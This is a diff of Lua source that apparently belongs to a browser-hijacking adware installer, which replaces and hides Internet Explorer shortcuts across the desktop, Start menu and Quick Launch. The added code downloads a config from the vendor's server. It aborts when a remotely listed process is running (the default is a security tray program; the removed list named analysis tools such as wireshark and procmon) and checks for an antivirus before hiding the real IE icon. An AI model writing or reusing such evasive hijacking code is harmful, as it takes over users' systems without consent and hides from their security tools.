@@ -522,24 +522,70 @@ function TryInstallIE()
 		return --没有释放
 	end
 	
-	local tBlackList = {"wireshark", "fiddler", "httpanalyzer", "smsniff", "filemon", "regmon", "procmon", "windbg", "ollydbg", "softice", "devenv", "cis","tasklist","procexp","ollyice","processspy","spyxx","cv"} 
+	DownLoadSetupConfig(AnalyseSetupConfig)
+end
+
+
+function DownLoadSetupConfig(fnCallBack)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local strURL = "http://www.91yuanbao.com/cmi/iesetupconfig.js"
+	local strSysTempDir = tipUtil:GetSystemTempPath()
+	local strSavePath = tipUtil:PathCombine(strSysTempDir, "iesetupconfig.js")
+	
+	local strStamp = FunctionObj.GetTimeStamp()
+	local strURLFix = strURL..strStamp
+	
+	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false, 
+		function(bRet, strIniPath)
+			FunctionObj.TipLog("[DownLoadSetupConfig] NewAsynGetHttpFile bRet : "..tostring(bRet)
+								.."  strSavePath: "..tostring(strSavePath))
+		
+			if bRet ~= 0 or not tipUtil:QueryFileExists(strIniPath) then
+				fnCallBack("")
+				return
+			end
+			
+			fnCallBack(strIniPath)			
+		end, 10*1000)
+end
+
+
+function AnalyseSetupConfig(strIniPath)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local tBlackList = GetBlackListForIE(strIniPath)
+	
 	for _, strProcessName in pairs(tBlackList) do
-		local strExeName = strProcessName..".exe"
+		local strExeName = string.lower(tostring(strProcessName))..".exe"
 		local bExists = tipUtil:QueryProcessExists(strExeName)
 		if bExists then
-			FunctionObj.TipLog("[TryInstallIE] blacklist process strExeName: "..tostring(strExeName))
+			FunctionObj.TipLog("[AnalyseSetupConfig] blacklist process strExeName: "..tostring(strExeName))
 			return --黑名单目录
 		end
 	end
 	
-	DoInstallIE()
+	DoInstallIE(strIniPath)
+	
+	local strRegFSPath = "HKEY_CURRENT_USER\\SOFTWARE\\YBYL\\regie"
 	FunctionObj.RegDeleteValue(strRegFSPath)
 end
 
 
-function DoInstallIE()
+function GetBlackListForIE(strIniPath)
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local tBlackList = {"QQPCTray"}
+	local strBlackList, bRet = tipUtil:ReadINI(strIniPath, "entrytype", "blacklist")
+	if not bRet or not IsRealString(strBlackList) then
+		return tBlackList
+	end
+
+	tBlackList = FunctionObj.SplitStringBySeperator(strBlackList, ",")
+	return tBlackList
+end
+
+
+function DoInstallIE(strIniPath)
 	WriteIERegister()
-	WriteIEShortCut()
+	WriteIEShortCut(strIniPath)
 	SendInstallIEReport()
 end
 
@@ -638,11 +684,12 @@ function GetFakeIEVersion()
 end
 
 
-function WriteIEShortCut()
-	CheckNeedHideICO(HideIEIco)
+function WriteIEShortCut(strIniPath)
+	CheckNeedHideICO(HideIEIco, strIniPath)
+	WriteStartMenuSC()
 	WriteStartMenuProgramSC()
 	WriteQuickLaunchSC()
-	WriteDesktopSC()
+	WriteDesktopSC(strIniPath)
 end
 
 function GetIELnkBakDir()
@@ -669,11 +716,11 @@ function CopyBackUpLnk(strSourcePath,strNamePreFix)
 end
 
 
-function CheckNeedHideICO(fnCallBack)
+function CheckNeedHideICO(fnCallBack, strIniPath)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local bNeedHideICO = true
 
-	function DoDefaultOperation()
+	function DoCheck360()
 		local bExists = tipUtil:QueryProcessExists("360tray.exe")
 		if bExists then
 			fnCallBack(not bNeedHideICO)
@@ -681,33 +728,19 @@ function CheckNeedHideICO(fnCallBack)
 			fnCallBack(bNeedHideICO)
 		end
 	end
-	
-	local strURL = "http://www.91yuanbao.com/cmi/iesetupconfig.js"
-	local strSysTempDir = tipUtil:GetSystemTempPath()
-	local strSavePath = tipUtil:PathCombine(strSysTempDir, "iesetupconfig.js")
-	
-	local strStamp = FunctionObj.GetTimeStamp()
-	local strURLFix = strURL..strStamp
-	
-	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false, 
-		function(bRet, strIniPath)
-			FunctionObj.TipLog("[CheckNeedHideICO] NewAsynGetHttpFile bRet : "..tostring(bRet)
-								.."  strSavePath: "..tostring(strSavePath))
 		
-			if bRet ~= 0 or not tipUtil:QueryFileExists(strIniPath) then
-				DoDefaultOperation()
-				return 
-			end
-			
-			local nIgnore360, bRet = tipUtil:ReadINI(strIniPath, "entryaction", "dtcheck")
-			if not bRet or tostring(nIgnore360) ~= "0" then
-				DoDefaultOperation()
-				return
-			end
-			
-			fnCallBack(bNeedHideICO)
-			
-		end, 10*1000)
+	if not tipUtil:QueryFileExists(strIniPath) then
+		fnCallBack(bNeedHideICO)
+		return 
+	end
+	
+	local nIgnore360, bRet = tipUtil:ReadINI(strIniPath, "entryaction", "dtcheck")
+	if bRet and tostring(nIgnore360) == "1" then
+		DoCheck360()
+		return
+	end
+	
+	fnCallBack(bNeedHideICO)
 end
 
 
@@ -733,7 +766,40 @@ function HideIEIco(bNeedHide)
 end
 
 
---开始菜单\程序\   目录
+--开始菜单目录
+function WriteStartMenuSC()
+	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	local nCSIDL_STARTMENU = 0xB
+	local nCSIDL_COMMON_STARTMENU = 0x16
+	local tStartMenuClsidl = {nCSIDL_STARTMENU, nCSIDL_COMMON_STARTMENU}
+	
+	for _, nCsidl in pairs(tStartMenuClsidl) do
+		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidl)
+		if IsRealString(strBaseDir) and tipUtil:QueryFileExists(strBaseDir) then
+		
+			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
+			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
+			if bIsInDir then
+				tipUtil:PinToStartMenu4XP(strCurrent, false)
+				--local bret = tipUtil:DeletePathFile(strCurrent)
+				CopyBackUpLnk(strCurrent,"STARTMENU")
+				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
+			end
+			
+			local strFilePath1 = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
+			local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strBaseDir)
+			if bIsInDir1 then
+				tipUtil:PinToStartMenu4XP(strCurrent1, false)
+				--local bret = tipUtil:DeletePathFile(strCurrent1)
+				CopyBackUpLnk(strCurrent1,"STARTMENU")
+				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
+			end
+		end
+	end
+end
+
+
+--开始菜单\程序  目录
 function WriteStartMenuProgramSC()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local nCSIDL_COMMON_PROGRAM = 0x17
@@ -802,7 +868,7 @@ end
 
 
 --桌面快捷方式
-function WriteDesktopSC()
+function WriteDesktopSC(strIniPath)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	local nCSIDL_DESKTOP = 0x10 
 	local nCSIDL_COMMON_DESKTOP = 0x19 
@@ -820,40 +886,38 @@ function WriteDesktopSC()
 		end
 		
 		if nCsidlDesktop == nCSIDL_DESKTOP then
-			CreateDesktopShortCut()
+			CreateDesktopShortCut(strIniPath)
 		end
 	end
 end
 
 
-function CreateDesktopShortCut()
+function CreateDesktopShortCut(strIniPath)
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
 	
-	local strURL = "http://www.91yuanbao.com/cmi/iesetupconfig.js"
-	local strSysTempDir = tipUtil:GetSystemTempPath()
-	local strSavePath = tipUtil:PathCombine(strSysTempDir, "iesetupconfig.js")
-	
-	local strStamp = FunctionObj.GetTimeStamp()
-	local strURLFix = strURL..strStamp
-	
-	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false, 
-		function(bRet, strIniPath)
-			FunctionObj.TipLog("[CheckNeedHideICO] NewAsynGetHttpFile bRet : "..tostring(bRet)
-								.."  strSavePath: "..tostring(strSavePath))
+	if not tipUtil:QueryFileExists(strIniPath) then
+		CreateDesktopReg()
+		return 
+	end
 		
-			if bRet ~= 0 or not tipUtil:QueryFileExists(strIniPath) then
-				CreateDesktopReg()
-				return 
-			end
-			
-			local nDTType, bRet = tipUtil:ReadINI(strIniPath, "entrytype", "dttype")
-			if not bRet or tostring(nDTType) ~= "0" then
-				CreateDesktopReg()
-				return
-			end
+	local tShortCutList = {}
+	local strShortCutList, bRet = tipUtil:ReadINI(strIniPath, "entrytype", "shortcutlist")
+	if bRet and IsRealString(strShortCutList) then
+		tShortCutList = FunctionObj.SplitStringBySeperator(strShortCutList, ",")
+	end
+
+	for _, strProcessName in pairs(tShortCutList) do
+		local strExeName = string.lower(tostring(strProcessName))..".exe"
+		local bExists = tipUtil:QueryProcessExists(strExeName)
+		if bExists then
+			FunctionObj.TipLog("[CreateDesktopShortCut] blacklist process strExeName: "..tostring(strExeName))
 			
 			CreateDesktopSCDefault()
-		end, 10*1000)
+			return --黑名单目录
+		end
+	end
+	
+	CreateDesktopReg()
 end
 
 
@@ -917,7 +981,6 @@ function CheckIsIELnkInDir(strDir)
 
 	return false
 end
-
 
 
 -----------------------instal ie end---
